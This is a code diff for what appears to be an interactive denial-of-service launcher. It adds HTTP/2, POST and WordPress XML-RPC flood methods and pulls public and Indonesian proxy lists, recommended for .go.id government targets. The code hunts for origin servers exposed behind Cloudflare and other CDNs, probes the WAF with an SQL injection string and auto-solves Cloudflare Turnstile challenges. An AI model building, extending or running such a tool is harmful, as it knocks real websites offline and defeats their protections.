@@ -1,9 +1,26 @@
 import os
 import sys
 import subprocess
+
+# [PRE-FLIGHT CHECK]
+try:
+    import requests
+    import aiohttp
+    import playwright
+except ImportError:
+    print('Missing dependencies. Redirecting to auto-installer...')
+    subprocess.check_call([sys.executable, 'install.py'])
+    sys.exit(1)
+
 import random
 import time
-import concurrent.futures
+import requests
+import asyncio
+import aiohttp
+import socket
+import urllib3
+
+urllib3.disable_warnings()
 
 class bcolors:
     HEADER = '\033[95m'
@@ -17,12 +34,88 @@ class bcolors:
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
 
+class ProxyManager:
+    @staticmethod
+    def prompt_and_download(target, use_proxy_input=True):
+        if not use_proxy_input: return False, []
+        
+        need_download = True
+        if os.path.exists("proxy.txt"):
+            print(f"{bcolors.OKCYAN}[?] proxy.txt found. Refresh/Replace it with FRESH proxies? (y/n): {bcolors.RESET}", end="")
+            if not input().lower().startswith("y"):
+                need_download = False
+                
+        if need_download:
+            print(f"{bcolors.OKCYAN}[?] Select Proxy Source:{bcolors.RESET}")
+            print(f"[{bcolors.OKCYAN}1{bcolors.RESET}] Public Mix (High Quantity, Low Quality)")
+            print(f"[{bcolors.OKCYAN}2{bcolors.RESET}] Indonesian Only (Best for .go.id targets)")
+            print(f"[{bcolors.OKCYAN}3{bcolors.RESET}] MIXED MODE (Max Ammo: Public + Indo)")
+
+            rec = "2" if ".id" in target else "1"
+            p_opt = input(f"{bcolors.BOLD}Select (1/2/3, Rec: {rec}): {bcolors.RESET}").strip()
+            ProxyManager.download_proxies(p_opt)
+            
+        return ProxyManager.load_proxies()
+
+    @staticmethod
+    def download_proxies(mode="1"):
+        print(f"{bcolors.WARNING}[*] Downloading proxies natively...{bcolors.RESET}")
+        proxies = set()
+        
+        # 1: Public, 2: Indo, 3: Mixed
+        try:
+            if mode in ["1", "3"]:
+                urls = [
+                    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
+                    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
+                    "https://raw.githubusercontent.com/zloi-user/hideip.me/main/http.txt",
+                    "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt"
+                ]
+                for u in urls:
+                    try:
+                        r = requests.get(u, timeout=10)
+                        for line in r.text.splitlines():
+                            if ":" in line: proxies.add(line.strip())
+                    except Exception as e:
+                        print(f"{bcolors.FAIL}[!] Failed to fetch {u}: {e}{bcolors.RESET}")
+
+            if mode in ["2", "3"]:
+                print(f"{bcolors.WARNING}[*] Fetching Fresh Indo Proxies from API...{bcolors.RESET}")
+                try:
+                    r = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=ID&ssl=all&anonymity=all", timeout=10)
+                    for line in r.text.splitlines():
+                        if ":" in line: proxies.add(line.strip())
+                except Exception as e:
+                    print(f"{bcolors.FAIL}[!] Failed to fetch Indo proxies: {e}{bcolors.RESET}")
+
+            with open("proxy.txt", "w", encoding="utf-8") as f:
+                f.write("\n".join(proxies))
+            print(f"{bcolors.OKGREEN}[+] Gathered {len(proxies)} unique proxies!{bcolors.RESET}")
+        except Exception as e:
+            print(f"{bcolors.FAIL}[!] Critical error during proxy fetch: {e}{bcolors.RESET}")
+
+    @staticmethod
+    def load_proxies():
+        print(f"{bcolors.OKCYAN}[*] Loading proxies from proxy.txt...{bcolors.RESET}")
+        try:
+            with open("proxy.txt", "r") as f:
+                proxy_list = [line.strip() for line in f if line.strip()]
+            if not proxy_list:
+                print(f"{bcolors.FAIL}[!] proxy.txt is empty! Falling back to direct connection.{bcolors.RESET}")
+                return False, []
+            else:
+                print(f"{bcolors.OKGREEN}[*] Loaded {len(proxy_list)} proxies.{bcolors.RESET}")
+                return True, proxy_list
+        except FileNotFoundError:
+             print(f"{bcolors.FAIL}[!] proxy.txt not found! Falling back to direct connection.{bcolors.RESET}")
+             return False, []
+
 def banner():
     print(f"""{bcolors.OKRED}
     ╦  ╦╔═╗╔╗╔  ╦ ╦╔═╗╦  ╔═╗╦╔╗╔╔═╗
     ╚╗╔╝╠═╣║║║  ╠═╣║╣ ║  ╚═╗║║║║║ ╦
      ╚╝ ╩ ╩╝╚╝  ╩ ╩╚═╝╩═╝╚═╝╩╝╚╝╚═╝ DoS
-    {bcolors.WARNING}Interactive Commander v1.0{bcolors.RESET}
+    {bcolors.WARNING}Interactive Commander v6.0 (Async){bcolors.RESET}
     """)
 
 def clear():
@@ -33,31 +126,28 @@ def main():
     banner()
 
     print(f"{bcolors.HEADER}[ SELECT METHOD ]{bcolors.RESET}")
-    print(f"[{bcolors.OKCYAN}1{bcolors.RESET}] SLOW    - (Best for Windows/Apache/XAMPP)")
-    print(f"[{bcolors.OKCYAN}2{bcolors.RESET}] DYN     - (Best for Nginx/Cloudflare/Evasion)")
-    print(f"[{bcolors.OKCYAN}3{bcolors.RESET}] STRESS  - (High Load/Universal Stress Test)")
-    print(f"[{bcolors.OKCYAN}4{bcolors.RESET}] XMLRPC  - (WordPress Amplification Method)")
-    print(f"[{bcolors.OKCYAN}5{bcolors.RESET}] POST_DYN- (Phase 2: Non-Cacheable POST Flood)")
-
-    
-    # [PHASE 17] Attack Intel Module
-    print(f"[{bcolors.OKCYAN}7{bcolors.RESET}] ATTACK INTEL (Origin Scan + Auto-Rec)")
-    
-    # [PHASE 23] Sentinel Monitor
-    print(f"[{bcolors.OKCYAN}8{bcolors.RESET}] SENTINEL     (Live Target Monitor)")
+    print(f"[{bcolors.OKCYAN}1{bcolors.RESET}] CHAOS / AUTO - (BEST! Auto-Detects WAF/CMS & Rotates Methods)")
+    print(f"[{bcolors.OKCYAN}2{bcolors.RESET}] SLOW         - (Best for Windows/Apache/XAMPP)")
+    print(f"[{bcolors.OKCYAN}3{bcolors.RESET}] DYN          - (Best for Nginx/Cloudflare/Evasion)")
+    print(f"[{bcolors.OKCYAN}4{bcolors.RESET}] STRESS       - (High Load/Universal Stress Test)")
+    print(f"[{bcolors.OKCYAN}5{bcolors.RESET}] XMLRPC       - (WordPress Amplification Method)")
+    print(f"[{bcolors.OKCYAN}6{bcolors.RESET}] POST_DYN     - (Post Flood without Cache)")
+    print(f"[{bcolors.OKCYAN}7{bcolors.RESET}] H2_FLOOD     - (HTTP/2 Multiplexing Async Flood)")
+    print(f"[{bcolors.OKCYAN}8{bcolors.RESET}] ATTACK INTEL - (Origin Scan + Auto-Rec)")
+    print(f"[{bcolors.OKCYAN}9{bcolors.RESET}] SENTINEL     - (Live Target Monitor)")
     print("")
     
-    choice = input(f"{bcolors.BOLD}Choose Method (1-8): {bcolors.RESET}")
+    choice = input(f"{bcolors.BOLD}Choose Method (1-9): {bcolors.RESET}")
     
-    if choice == "7":
+    if choice == "8":
         run_intel()
         sys.exit(0)
-    elif choice == "8":
+    elif choice == "9":
         run_sentinel()
         sys.exit(0)
 
-    methods = {"1": "SLOW", "2": "DYN", "3": "STRESS", "4": "XMLRPC", "5": "POST_DYN", "6": "H2_FLOOD"}
-    method = methods.get(choice, "SLOW")
+    methods = {"1": "CHAOS", "2": "SLOW", "3": "DYN", "4": "STRESS", "5": "XMLRPC", "6": "POST_DYN", "7": "H2_FLOOD"}
+    method = methods.get(choice, "CHAOS")
 
     clear()
     banner()
@@ -88,7 +178,7 @@ def main():
         print(f"{bcolors.RESET}", end="")
     elif proxy_choice == "3":
         proxy_file = "proxy.txt"
-        proxy_type = "7" # Indo Scavenger mode
+        proxy_type = "7" 
     else:
         proxy_file = "proxy.txt"
         proxy_type = "5"
@@ -96,7 +186,6 @@ def main():
     clear()
     banner()
     print(f"{bcolors.HEADER}[ INTENSITY CONFIGURATION ]{bcolors.RESET}")
-    print(f"{bcolors.WARNING}Note: Running multiple terminals is better than high thread counts.{bcolors.RESET}")
     
     threads = input(f"Threads (Recommended: 100-500, current best: 100): {bcolors.OKBLUE}").strip() or "100"
     print(f"{bcolors.RESET}", end="")
@@ -107,18 +196,9 @@ def main():
     duration = input(f"Duration in Seconds (e.g. 800): {bcolors.OKBLUE}").strip() or "800"
     print(f"{bcolors.RESET}", end="")
 
-    # Preparation for execution
-    # MHDDoS/VanHelsing structure: python3 start.py <METHOD> <URL> <PROXY_TYPE> <THREADS> <PROXY_FILE> <RPC> <DURATION>
-
     cmd = [
         sys.executable, "start.py",
-        method,
-        target,
-        proxy_type,
-        threads,
-        proxy_file,
-        rpc,
-        duration
+        method, target, proxy_type, threads, proxy_file, rpc, duration
     ]
 
     clear()
@@ -136,6 +216,102 @@ def main():
     except Exception as e:
         print(f"\n{bcolors.FAIL}Error: {e}{bcolors.RESET}")
 
+# ----------------- ASYNC RECON TOOLS -----------------
+async def scan_port(sem, target, port):
+    async with sem:
+        try:
+            reader, writer = await asyncio.wait_for(asyncio.open_connection(target, port), timeout=2.0)
+            writer.close()
+            await writer.wait_closed()
+            return port
+        except:
+            return None
+
+async def run_port_scan(target_domain, ports):
+    sem = asyncio.Semaphore(100)
+    tasks = [scan_port(sem, target_domain, p) for p in ports]
+    results = await asyncio.gather(*tasks)
+    return [p for p in results if p]
+
+_waf_asn_cache = {}
+
+async def check_subdomain_async(sem, sub_domain, target_domain, resolved_ip, main_sig, session):
+    async with sem:
+        try:
+            loop = asyncio.get_event_loop()
+            sub_ip = await loop.run_in_executor(None, socket.gethostbyname, sub_domain)
+            if sub_ip == resolved_ip: return None # Skip same IP to avoid false positives entirely
+            
+            is_candidate = False
+            match_status = f"{bcolors.WARNING}UNVERIFIED{bcolors.RESET}"
+            
+            # WAF IP Verification Check via ip-api
+            waf_detected = False
+            if sub_ip not in _waf_asn_cache:
+                try:
+                    async with session.get(f"http://ip-api.com/json/{sub_ip}?fields=isp,as", timeout=3) as rip:
+                        if rip.status == 200:
+                            data = await rip.json()
+                            isp_info = (data.get("isp", "") + " " + data.get("as", "")).lower()
+                            if any(waf in isp_info for waf in ["cloudflare", "akamai", "fastly", "imperva", "sucuri"]):
+                                _waf_asn_cache[sub_ip] = True
+                            else:
+                                _waf_asn_cache[sub_ip] = False
+                except Exception:
+                    _waf_asn_cache[sub_ip] = False
+            
+            waf_detected = _waf_asn_cache.get(sub_ip, False)
+
+            if waf_detected:
+                match_status = f"{bcolors.WARNING}CDN/WAF IP (Not Origin){bcolors.RESET}"
+            else:
+                try:
+                    async with session.get(f"http://{sub_domain}", timeout=3, ssl=False) as r_check:
+                        content = await r_check.read()
+                        check_sig = len(content)
+                        if main_sig > 0:
+                            ratio = abs(main_sig - check_sig) / main_sig
+                            if ratio < 0.2:
+                                match_status = f"{bcolors.FAIL}CONFIRMED EXPOSED ORIGIN!{bcolors.RESET}"
+                                is_candidate = True
+                            else:
+                                match_status = f"{bcolors.OKCYAN}Content Mismatch{bcolors.RESET}"
+                        else:
+                            is_candidate = True # Assumed origin if main sig is 0
+                except Exception:
+                    match_status = "Dead/Timeout"
+            
+            return (sub_domain, sub_ip, match_status, is_candidate)
+        except Exception:
+            return None
+
+async def run_zone_hunter(scan_list, target_domain, resolved_ip, main_sig):
+    sem = asyncio.Semaphore(50)
+    results = []
+    exposed_origin = None
+    
+    print(f"[*] Scanning {len(scan_list)} subdomains via AsyncIO...")
+    connector = aiohttp.TCPConnector(verify_ssl=False)
+    async with aiohttp.ClientSession(connector=connector) as session:
+        tasks = [asyncio.create_task(check_subdomain_async(sem, sub, target_domain, resolved_ip, main_sig, session)) for sub in scan_list]
+        completed = 0
+        total = len(scan_list)
+        for f in asyncio.as_completed(tasks):
+            completed += 1
+            print(f"[*] Scanning Progress: [{completed}/{total}] ...{' '*20}", end="\r")
+            try:
+                res = await f
+                if res:
+                    sub_domain, sub_ip, match_status, is_candidate = res
+                    print(f"{' '*60}", end="\r") 
+                    print(f"[*] Found {sub_domain:<30} : {sub_ip} | {match_status}")
+                    if is_candidate and not exposed_origin:
+                        exposed_origin = sub_domain
+            except Exception as e:
+                pass
+    return exposed_origin
+
+
 def run_intel():
     clear()
     banner()
@@ -150,211 +326,71 @@ def run_intel():
         target_domain = target.split("/")[0]
         target_url = f"https://{target}"
 
-    # Initialize common subdomains for Zone Hunter
     common_subs = ["origin", "direct", "cpanel", "mail", "dev", "test", "api", "ftp", "beta", "admin", "secure", "www1", "web"]
-
     print("-" * 40)
     
-    # [PHASE 21] Stealth Mode (Proxy Support)
     use_proxy = False
-    proxies = None
     print(f"{bcolors.WARNING}[?] Enable Stealth Mode (Use Proxies for Scan)? (y/n): {bcolors.RESET}", end="")
-    if input().lower().startswith("y"):
-        use_proxy = True
-        
-        # [NEW] Auto-Refresh Logic (Copied from Sentinel)
-        need_download = False
-        if not os.path.exists("proxy.txt"):
-             print(f"{bcolors.FAIL}[!] proxy.txt not found!{bcolors.RESET}")
-             need_download = True
-        else:
-             print(f"{bcolors.OKCYAN}[?] proxy.txt found. Refresh/Replace it with FRESH proxies? (y/n): {bcolors.RESET}", end="")
-             if input().lower().startswith("y"):
-                  need_download = True
-        
-        if need_download:
-             print(f"{bcolors.OKCYAN}[?] Select Proxy Source:{bcolors.RESET}")
-             print(f"[{bcolors.OKCYAN}1{bcolors.RESET}] Public Mix (High Quantity, Low Quality)")
-             print(f"[{bcolors.OKCYAN}2{bcolors.RESET}] Indonesian Only (Best for .go.id targets)")
-             print(f"[{bcolors.OKCYAN}3{bcolors.RESET}] MIXED MODE (Max Ammo: Public + Indo)")
-
-             rec = "2" if ".id" in target else "1"
-             p_opt = input(f"{bcolors.BOLD}Select (1/2/3, Rec: {rec}): {bcolors.RESET}").strip()
-             
-             if p_opt == "1":
-                 print(f"{bcolors.WARNING}[*] Fetching Public Mix from multiple sources...{bcolors.RESET}")
-                 os.system("curl -s https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt > proxy.txt")
-                 os.system("curl -s https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt >> proxy.txt")
-                 os.system("curl -s https://raw.githubusercontent.com/zloi-user/hideip.me/main/http.txt >> proxy.txt")
-                 os.system("curl -s https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt >> proxy.txt")
-             elif p_opt == "2":
-                 print(f"{bcolors.WARNING}[*] Fetching Fresh Indo Proxies from API...{bcolors.RESET}")
-                 os.system("curl -s \"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=ID&ssl=all&anonymity=all\" > proxy.txt")
-             elif p_opt == "3":
-                 print(f"{bcolors.WARNING}[*] Fetching Mixed Proxies (Mega-Pack: Public + Indo API)...{bcolors.RESET}")
-                 # 1. Download Public Lists
-                 os.system("curl -s https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt > public.txt")
-                 os.system("curl -s https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt >> public.txt")
-                 os.system("curl -s https://raw.githubusercontent.com/zloi-user/hideip.me/main/http.txt >> public.txt")
-                 os.system("curl -s https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt >> public.txt")
-                 
-                 # 2. Download Indo List
-                 os.system("curl -s \"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=ID&ssl=all&anonymity=all\" > indo.txt")
-                 try:
-                     with open("public.txt", "r", encoding="utf-8", errors="ignore") as f1, \
-                          open("indo.txt", "r", encoding="utf-8", errors="ignore") as f2, \
-                          open("proxy.txt", "w", encoding="utf-8") as out:
-                         c1 = f1.read()
-                         c2 = f2.read()
-                         out.write(c1 + "\n" + c2)
-                 except: pass
-                 if os.path.exists("public.txt"): os.remove("public.txt")
-                 if os.path.exists("indo.txt"): os.remove("indo.txt")
-                 
-                 # 3. Clean Duplicates
-                 if os.path.exists("proxy.txt"):
-                      unique_lines = set()
-                      with open("proxy.txt", "r", encoding="utf-8", errors="ignore") as f:
-                          for line in f:
-                              if ":" in line: unique_lines.add(line.strip())
-                      with open("proxy.txt", "w", encoding="utf-8") as f:
-                          f.write("\n".join(unique_lines))
-
-        print(f"{bcolors.OKCYAN}[*] Loading proxies from proxy.txt...{bcolors.RESET}")
-        try:
-            with open("proxy.txt", "r") as f:
-                proxy_list = [line.strip() for line in f if line.strip()]
-            if not proxy_list:
-                print(f"{bcolors.FAIL}[!] proxy.txt is empty! Falling back to direct connection.{bcolors.RESET}")
-                use_proxy = False
-            else:
-                print(f"{bcolors.OKGREEN}[*] Loaded {len(proxy_list)} proxies.{bcolors.RESET}")
-        except FileNotFoundError:
-             print(f"{bcolors.FAIL}[!] proxy.txt not found! Falling back to direct connection.{bcolors.RESET}")
-             use_proxy = False
+    ans = input().lower()
+    if ans.startswith("y"):
+        use_proxy, proxy_list = ProxyManager.prompt_and_download(target, True)
 
     print(f"{bcolors.OKCYAN}Phase 1: DNS & Origin Resolution...{bcolors.RESET}")
-    
     resolved_ip = None
     try:
-        import socket
         resolved_ip = socket.gethostbyname(target_domain)
         print(f"[*] DNS Resolved IP: {bcolors.BOLD}{resolved_ip}{bcolors.RESET}")
-    except Exception as e:
+    except socket.gaierror as e:
         print(f"{bcolors.FAIL}[!] DNS Resolution Failed: {e}{bcolors.RESET}")
+        return
 
-    print(f"\n{bcolors.OKCYAN}Phase 2: Port & Backend Scanner...{bcolors.RESET}")
-    open_ports = []
+    print(f"\n{bcolors.OKCYAN}Phase 2: Port & Backend Scanner (Async)...{bcolors.RESET}")
     interesting_ports = [80, 443, 8080, 8443, 2052, 2053, 2082, 2083, 2086, 2087, 8880]
     
-    def check_port(port):
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(2) # Increased timeout for accuracy since we are threaded
-            result = sock.connect_ex((target_domain, port))
-            sock.close()
-            if result == 0:
-                print(f"[*] Port {port:<5} : {bcolors.OKGREEN}OPEN{bcolors.RESET}")
-                return port
-        except:
-            pass
-        return None
-
-    try:
-        import socket
-        import concurrent.futures
-        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
-            futures = [executor.submit(check_port, p) for p in interesting_ports]
-            for future in concurrent.futures.as_completed(futures):
-                p = future.result()
-                if p: open_ports.append(p)
-
-        if not open_ports:
-            print(f"[*] Ports      : {bcolors.WARNING}No common opened ports found (FW Blocked?){bcolors.RESET}")
-    except Exception as e:
-        print(f"[!] Port Scan Error: {e}")
+    open_ports = asyncio.run(run_port_scan(target_domain, interesting_ports))
+    if open_ports:
+        for p in open_ports:
+             print(f"[*] Port {p:<5} : {bcolors.OKGREEN}OPEN{bcolors.RESET}")
+    else:
+        print(f"[*] Ports      : {bcolors.WARNING}No common opened ports found{bcolors.RESET}")
 
     print(f"\n{bcolors.OKCYAN}Phase 3: CMS & Vulnerability Hunter...{bcolors.RESET}")
-    # Initialize Defaults
     cms_detected = "Unknown"
     vuln_vector = None
     server_header = "Unknown"
     cdn_guess = "Unknown"
+    pass_clearance_to_start = False
     
-    # helper scope
-    get_req_kwargs = None
-    get_robust_response = None
-    head_robust_response = None
+    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'}
     
-    # Setup Block
-    try:
-        import requests
-        import urllib3
-        urllib3.disable_warnings() 
+    def get_req_kwargs():
+        kwargs = {'headers': headers, 'timeout': 5, 'verify': False}
+        if use_proxy and proxy_list:
+            p = random.choice(proxy_list)
+            if "://" not in p: p = f"http://{p}"
+            kwargs['proxies'] = {'http': p, 'https': p}
+        return kwargs
+
+    def get_robust_response(url, retries=3):
+        for i in range(retries):
+            try:
+                kwargs = get_req_kwargs()
+                if i > 0: print(f"{bcolors.WARNING}[-] Connection Failed. Retrying ({i+1}/{retries})...{bcolors.RESET}{' '*20}", end="\r")
+                r = requests.get(url, **kwargs)
+                if i > 0: print(f"{' '*80}", end="\r")
+                return r
+            except Exception as e:
+                if i == retries - 1: raise e
+        raise Exception("Max retries")
         
-        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'}
-        
-        def _get_req_kwargs():
-            # [OPTIMIZATION] Reduced timeout from 10s to 4s for faster rotation
-            kwargs = {'headers': headers, 'timeout': 4, 'verify': False}
-            if use_proxy and proxy_list:
-                p = random.choice(proxy_list)
-                if "://" not in p: p = f"http://{p}"
-                kwargs['proxies'] = {'http': p, 'https': p}
-            return kwargs
-        get_req_kwargs = _get_req_kwargs
-
-        def _get_robust_response(url, retries=50):
-            # Persistent Retry Mode: Tries up to 50 times (User requested "until success")
-            for i in range(retries):
-                try:
-                    kwargs = get_req_kwargs()
-                    if i > 0:
-                        # Padded with spaces to overwrite previous line completely
-                        print(f"{bcolors.WARNING}[-] Connection Failed. Rotating Proxy & Retrying ({i+1}/{retries})...{bcolors.RESET}{' '*20}", end="\r")
-                    r = requests.get(url, **kwargs)
-                    # [FIX] Clear the retry line upon success to prevent text artifacts
-                    if i > 0: print(f"{' '*80}", end="\r")
-                    return r
-                except Exception:
-                    if not use_proxy: raise 
-                    continue
-            raise Exception("Max retries exceeded (Pro Tip: Check your connection or Proxy List!)")
-        get_robust_response = _get_robust_response
-            
-        def _head_robust_response(url, retries=50):
-             for i in range(retries):
-                try:
-                    kwargs = get_req_kwargs()
-                    if i > 0:
-                        print(f"{bcolors.WARNING}[-] Connection Failed. Rotating Proxy & Retrying ({i+1}/{retries})...{bcolors.RESET}{' '*20}", end="\r")
-                    r = requests.head(url, **kwargs)
-                    if i > 0: print(f"{' '*80}", end="\r")
-                    return r
-                except Exception:
-                    if not use_proxy: raise
-                    continue
-             raise Exception("Max retries exceeded")
-        head_robust_response = _head_robust_response
-
-    except ImportError:
-         print(f"{bcolors.FAIL}[!] Missing requests library.{bcolors.RESET}")
-         return
-
-    # Phase 3 Logic Block
     try:
-        # 1. Base Check
-        r = head_robust_response(target_url)
+        r = get_robust_response(target_url)
         server_header = r.headers.get('Server', 'Unknown')
         powered_by = r.headers.get('X-Powered-By', 'Unknown')
         print(f"[*] Server       : {bcolors.OKGREEN}{server_header}{bcolors.RESET}")
 
-        # 2. WAF Detection
-        wafs = {
-            "cloudflare": "Cloudflare", "akamai": "Akamai", "fastly": "Fastly", 
-            "imperva": "Imperva", "incapsula": "Imperva", "sucuri": "Sucuri"
-        }
         headers_str = str(r.headers).lower()
+        wafs = {"cloudflare": "Cloudflare", "akamai": "Akamai", "fastly": "Fastly", "imperva": "Imperva", "sucuri": "Sucuri"}
         for key, name in wafs.items():
             if key in headers_str:
                 cdn_guess = name
@@ -362,12 +398,10 @@ def run_intel():
         if cdn_guess != "Unknown":
             print(f"[*] CDN/WAF      : {bcolors.FAIL}{cdn_guess}{bcolors.RESET}")
 
-        # 3. WordPress XMLRPC Check
         print("[*] Checking for WordPress XML-RPC...", end="\r")
         try:
-            xml_url = f"{target_url}/xmlrpc.php"
-            r_xml = get_robust_response(xml_url)
-            if r_xml.status_code == 405 or "XML-RPC server accepts POST requests only" in r_xml.text:
+            r_xml = get_robust_response(f"{target_url}/xmlrpc.php", retries=2)
+            if r_xml.status_code == 405 or "XML-RPC server accepts" in r_xml.text:
                 print(f"[*] XML-RPC      : {bcolors.FAIL}VULNERABLE (Use Menu 4!){bcolors.RESET}   ")
                 cms_detected = "WordPress"
                 vuln_vector = "XMLRPC"
@@ -376,262 +410,136 @@ def run_intel():
         except:
              print(f"[*] XML-RPC      : Error Checking           ")
         
-        # [PHASE 29] Technology Detective 🕵️‍♂️
         try:
-            cookies = str(r.cookies.get_dict()).lower()
-            if "phpsessid" in cookies:
-                print(f"[*] Technology   : {bcolors.WARNING}PHP Detected (Cookie){bcolors.RESET}")
-                if "Apache" in server_header: vuln_vector = "SLOW_POST" # PHP+Apache weak to Slow POST
-            elif "asp.net" in cookies or "asp.net" in powered_by.lower():
-                print(f"[*] Technology   : {bcolors.WARNING}ASP.NET (Microsoft){bcolors.RESET}")
-            elif "csrftoken" in cookies and "sessionid" in cookies:
-                print(f"[*] Technology   : {bcolors.WARNING}Python/Django{bcolors.RESET}")
-            elif "jsession" in cookies:
-                print(f"[*] Technology   : {bcolors.WARNING}Java/JSP{bcolors.RESET}")
+            cookies_str = str(r.cookies.get_dict()).lower()
+            if "phpsessid" in cookies_str:
+                print(f"[*] Technology   : {bcolors.WARNING}PHP Detected{bcolors.RESET}")
+                if "Apache" in server_header: vuln_vector = "SLOW_POST"
+            elif "asp.net" in cookies_str or "asp.net" in powered_by.lower():
+                print(f"[*] Technology   : {bcolors.WARNING}ASP.NET{bcolors.RESET}")
         except: pass
 
-        # [PHASE 29] WAF Stress Probe 🛡️
-        # [UPDATED] Running WAF Probe for ALL targets (including hidden WAFs)
         print("[*] Probing WAF Sensitivity...", end="\r")
         try:
-            # Send benign SQLi payload
-            payload_url = f"{target_url}?search=' OR 1=1"
-            r_waf = get_robust_response(payload_url, retries=2)
-            
-            if r_waf.status_code in [403, 406, 501]:
-                print(f"[*] WAF Status   : {bcolors.OKGREEN}ACTIVE & SENSITIVE (Blocking SQLi){bcolors.RESET}   ")
-            elif r_waf.status_code == 200:
-                print(f"[*] WAF Status   : {bcolors.FAIL}PASSIVE/BYPASSED (Payload Accepted){bcolors.RESET}   ")
-            else: 
-                 print(f"[*] WAF Status   : Unknown ({r_waf.status_code})           ")
-        except:
-            print(f"[*] WAF Status   : Blocking Connection (Highly Sensitive)   ")
+            if r.status_code in [403, 503] and ("cloudflare" in headers_str or "turnstile" in r.text.lower() or "challenge" in r.text.lower()):
+                 print(f"[*] WAF Status   : {bcolors.FAIL}Cloudflare JS Challenge/Turnstile Detected!{bcolors.RESET}")
+                 print(f"[*] Mitigation   : {bcolors.WARNING}Auto-Launching Playwright Turnstile Dispenser...{bcolors.RESET}")
+                 try:
+                     from turnstile_dispenser import TurnstileDispenser
+                     cf_clearance, cf_ua = TurnstileDispenser.solve_challenge(target_url)
+                     if cf_clearance:
+                         print(f"[*] Dispenser    : {bcolors.OKGREEN}Clearance Secured! Writing to files/cf_clearance.txt{bcolors.RESET}")
+                         os.makedirs('files', exist_ok=True)
+                         with open("files/cf_clearance.txt", "w") as cf_file:
+                             cf_file.write(cf_clearance)
+                         pass_clearance_to_start = True
+                     else:
+                         print(f"[*] Dispenser    : {bcolors.FAIL}Failed to break Turnstile.{bcolors.RESET}")
+                 except Exception as err:
+                     print(f"[*] Dispenser    : {bcolors.FAIL}Execution failed: {err}{bcolors.RESET}")
+            else:
+                r_waf = get_robust_response(f"{target_url}?search=' OR 1=1", retries=1)
+                if r_waf.status_code in [403, 406, 501]:
+                    print(f"[*] WAF Status   : {bcolors.OKGREEN}ACTIVE & SENSITIVE (Blocking SQLi){bcolors.RESET}   ")
+                elif r_waf.status_code == 200:
+                    print(f"[*] WAF Status   : {bcolors.FAIL}PASSIVE/BYPASSED (Payload Accepted){bcolors.RESET}   ")
+                else: 
+                     print(f"[*] WAF Status   : Unknown ({r_waf.status_code})           ")
+        except Exception as e:
+            print(f"[*] WAF Status   : Error Probe: {e}   ")
              
     except Exception as e:
-        print(f"{bcolors.FAIL}[!] Phase 3 Error: {e} (Connection failed or Max Retries){bcolors.RESET}")
+        print(f"{bcolors.FAIL}[!] Phase 3 Error: {e}{bcolors.RESET}")
 
-    # [PHASE 20] SSL Certificate Inspector (Deep Search)
-    print(f"\n{bcolors.OKCYAN}Phase 4: SSL/SNI Inspector (Deep Search)...{bcolors.RESET}")
-    ssl_sans = []
-    try:
-        import ssl
-        ctx = ssl.create_default_context()
-        ctx.check_hostname = False
-        ctx.verify_mode = ssl.CERT_NONE
-        with socket.create_connection((target_domain, 443), timeout=5) as sock:
-            with ctx.wrap_socket(sock, server_hostname=target_domain) as ssock:
-                cert = ssock.getpeercert()
-                # In some python versions/platforms getpeercert() return empty if verify_mode=CERT_NONE
-                # We might need to fetch it differently or enable verify temporarily if possible, 
-                # but standard lib often requires a CA bundle.
-                # Let's try to parse commonName or subjectAltName if available.
-                # If CERT_NONE returns nothing, we skip.
-                pass 
-        
-        # Re-try with active verification for SANs (usually safe)
-        ctx = ssl.create_default_context()
-        with socket.create_connection((target_domain, 443), timeout=5) as sock:
-            with ctx.wrap_socket(sock, server_hostname=target_domain) as ssock:
-                cert = ssock.getpeercert()
-                for field in cert.get('subjectAltName', []):
-                    if field[0] == 'DNS':
-                        ssl_sans.append(field[1])
-        
-        if ssl_sans:
-            print(f"[*] SSL SANs Found: {bcolors.OKGREEN}{len(ssl_sans)} domains{bcolors.RESET}")
-            # Add SANs to common_subs for Zone Hunter
-            common_subs.extend([san.split('.')[0] for san in ssl_sans if target_domain in san])
-    except Exception as e:
-        print(f"[*] SSL Inspector: {e} (Skipping)")
 
-        # [PHASE 24] CRT.SH Deep Subdomain Recon
-        print(f"\n{bcolors.OKCYAN}Phase 4.5: CRT.SH Certificate Search...{bcolors.RESET}")
+    print(f"\n{bcolors.OKCYAN}Phase 4: CRT.SH Certificate Search...{bcolors.RESET}")
     try:
-        # CRT.SH often times out with proxies, so we try with text/html or json
-        crt_url = f"https://crt.sh/?q=%.{target_domain}&output=json"
-        
-        # [OPTIMIZATION] reduced retries for CRT.SH to avoid long waits
-        r_crt = get_robust_response(crt_url, retries=3)
-        
+        r_crt = get_robust_response(f"https://crt.sh/?q=%.{target_domain}&output=json", retries=2)
         if r_crt.status_code == 200:
             try:
-                crt_data = r_crt.json()
                 crt_subs = set()
-                for entry in crt_data:
+                for entry in r_crt.json():
                     name = entry.get('name_value', '')
-                    if "\n" in name:
-                        parts = name.split("\n")
-                        for p in parts:
-                            if target_domain in p and "*" not in p:
-                                crt_subs.add(p)
-                    elif target_domain in name and "*" not in name:
-                        crt_subs.add(name)
-                
+                    for p in name.split("\\n"):
+                        if target_domain in p and "*" not in p:
+                            crt_subs.add(p)
                 if crt_subs:
